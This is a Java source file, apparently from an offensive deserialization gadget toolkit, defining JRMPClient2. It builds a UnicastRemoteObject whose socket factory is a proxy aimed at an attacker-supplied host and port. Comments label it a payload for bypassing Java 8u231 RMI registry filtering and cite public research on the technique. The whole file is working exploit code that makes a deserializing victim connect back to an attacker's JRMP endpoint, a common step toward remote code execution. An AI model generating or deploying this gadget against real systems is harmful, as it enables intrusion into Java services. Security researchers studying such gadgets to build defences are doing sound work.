package com.aurora.Gadgets;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Random;

@SuppressWarnings ( {
    "restriction"
} )
public class JRMPClient2  {

    //https://github.com/hex0wn/learn-java-bug/blob/2861e0a7f3769dc1383b12c2650ffd314c6d3ad2/rmi/src/main/java/org/example/EvilBind.java
    //bypass 8u231的Payload。
    //    https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/
    public UnicastRemoteObject getObject(String command) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }

        // 1. Create a new TCPEndpoint and UnicastRef instance.
        // The TCPEndpoint contains the IP/port of the attacker
        // Taken from Moritz Bechlers JRMP Client
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry

        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(id, te, false));

        // 2. Create a new instance of RemoteObjectInvocationHandler,
        // passing the RemoteRef object (refObject) with the attacker controlled IP/port in the constructor
        RemoteObjectInvocationHandler myInvocationHandler = new RemoteObjectInvocationHandler(refObject);

        // 3. Create a dynamic proxy class that implements the classes/interfaces RMIServerSocketFactory
        // and Remote and passes all incoming calls to the invoke method of the
        // RemoteObjectInvocationHandler
        RMIServerSocketFactory handcraftedSSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),
            new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
            myInvocationHandler);

        // 4. Create a new UnicastRemoteObject instance by using Reflection
        // Make the constructor public
        Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);
        constructor.setAccessible(true);
        UnicastRemoteObject myRemoteObject = (UnicastRemoteObject) constructor.newInstance(null);

        // 5. Make the ssf instance accessible (again by using Reflection) and set it to the proxy object
        Field privateSsfField = UnicastRemoteObject.class.getDeclaredField("ssf");
        privateSsfField.setAccessible(true);

        // 6. Set the ssf instance of the UnicastRemoteObject to our proxy
        privateSsfField.set(myRemoteObject, handcraftedSSF);

        // return the gadget
        return myRemoteObject;
    }
    public static void main ( final String[] args) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());
        //PayloadRunner.run(JRMPClient2.class, new String[]{"127.0.0.1:1099"} );
    }
}
